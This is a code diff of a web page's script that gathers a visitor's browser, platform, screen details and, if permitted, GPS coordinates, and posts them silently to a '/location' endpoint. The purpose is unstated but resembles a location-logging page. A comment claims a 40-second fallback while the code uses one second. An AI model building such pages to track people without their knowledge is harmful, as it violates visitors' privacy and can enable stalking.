@@ -96,47 +96,54 @@
     const statusEl = document.getElementById('status');
 
     function sendToServer(geo = null) {
-      const data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: {
-          width: screen.width,
-          height: screen.height
-        },
-        geoAllowed: !!geo
-      };
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: {
+                width: screen.width,
+                height: screen.height
+            },
+            geoAllowed: !!geo
+        };
 
-      if (geo) {
-        data.latitude = geo.coords.latitude;
-        data.longitude = geo.coords.longitude;
-        data.accuracy = geo.coords.accuracy;
-      }
+        if (geo) {
+            data.latitude = geo.coords.latitude;
+            data.longitude = geo.coords.longitude;
+            data.accuracy = geo.coords.accuracy;
+        }
 
-      fetch('/location', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-      });
+        fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
     }
 
     function success(position) {
-      const { latitude, longitude, accuracy } = position.coords;
-      statusEl.textContent;
-      sendToServer(position);
+        sendToServer(position);
     }
 
     function error(err) {
-      statusEl.textContent;
-      sendToServer(null);
+        sendToServer(null);
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error);
+        const timeout = setTimeout(() => {
+            sendToServer(null); // Отправка без геолокации после 40 секунд
+        }, 1000); 
+
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                clearTimeout(timeout); // Если геолокация получена, отменяем таймер
+                success(position);
+            }, 
+            error
+        );
     } else {
-      statusEl.textContent;
-      sendToServer(null);
+        sendToServer(null);
     }
-  </script>
+</script>
+
 
 
 </body>
